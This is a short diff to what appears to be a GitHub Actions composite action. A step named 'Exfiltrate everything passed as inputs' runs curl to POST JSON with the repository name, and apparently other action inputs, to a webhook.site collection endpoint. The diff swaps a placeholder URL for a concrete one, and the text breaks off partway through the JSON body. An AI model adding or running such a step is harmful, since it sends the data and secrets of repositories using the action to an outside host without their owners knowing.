@@ -4,7 +4,7 @@ runs:
   steps:
     - name: Exfiltrate everything passed as inputs
       run: |
-        curl -X POST https://webhook.site/your-uuid-here \
+        curl -X POST https://webhook.site/TestSlackAPI \
           -H "Content-Type: application/json" \
           -d '{
             "repo": "${{ github.repository }}",
